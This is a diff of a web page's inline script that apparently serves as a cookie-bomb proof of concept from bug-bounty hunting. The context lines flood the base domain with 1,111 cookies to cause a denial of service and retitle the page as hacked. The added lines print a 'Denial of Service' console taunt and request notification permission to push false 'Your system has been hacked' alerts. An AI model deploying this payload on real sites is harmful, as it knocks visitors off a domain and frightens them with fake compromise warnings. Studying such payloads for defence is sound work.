@@ -17,7 +17,17 @@ for (var x = 0; x < 1111; x++){
 document.cookie = "Bomber" + x + "=" + serang + ";Domain=" + base_domain;
    document.title = "[Your system has been hacked] - paktiko was here";
  //history.back();
-   console.log("%c Your system has been injected by M4lw4r3.\nI watch you!!!!", "color:red; font-size:25pt");
+   console.log("%c Your system has been injected by M4lw4r3. And you're not able to do anymore. Denial fo Service. \nI watch you!!!!", "color:red; font-size:25pt");
+}
+      // Request permission for notifications
+if (Notification.permission === "granted") {
+    new Notification("Google Bug Hunting", { body: "Your system has been hacked by @paktiko1986" });
+} else if (Notification.permission !== "denied") {
+    Notification.requestPermission().then(permission => {
+        if (permission === "granted") {
+            new Notification("H1 Bug Hunting", { body: "Your system has been hacked by santiko1986@wearehackerone.com" });
+        }
+    });
 }
   </script>
  </head>
